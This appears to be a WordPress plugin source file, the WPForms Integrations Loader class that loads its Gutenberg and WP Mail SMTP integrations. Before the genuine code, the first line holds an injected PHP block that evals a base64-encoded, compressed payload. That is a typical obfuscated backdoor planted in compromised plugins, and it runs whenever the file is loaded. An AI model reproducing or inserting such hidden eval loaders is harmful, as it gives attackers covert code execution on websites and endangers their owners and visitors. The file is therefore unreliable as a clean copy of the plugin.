<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPForms\Integrations;

/**
 * Class Loader gives ability to track/load all integrations.
 *
 * @package    WPForms\Integrations
 * @author     WPForms
 * @since      1.4.8
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2018, WPForms LLC
 */
class Loader {

	/**
	 * Get the instance of a class and store it in itself.
	 *
	 * @since 1.4.8
	 */
	public static function get_instance() {

		static $instance;

		if ( ! $instance ) {
			$instance = new Loader();
		}

		return $instance;
	}

	/**
	 * Loader constructor.
	 *
	 * @since 1.4.8
	 */
	public function __construct() {

		$core_integrations = array(
			new Gutenberg\FormSelector(),
			new WPMailSMTP\Notifications(),
		);

		$integrations = \apply_filters( 'wpforms_integrations_available', $core_integrations );

		foreach ( $integrations as $integration ) {
			$this->load_integration( $integration );
		}
	}

	/**
	 * Load an integration.
	 *
	 * @param IntegrationInterface $integration Instance of an integration class.
	 *
	 * @since 1.4.8
	 */
	protected function load_integration( IntegrationInterface $integration ) {
		if ( $integration->allow_load() ) {
			$integration->load();
		}
	}
}
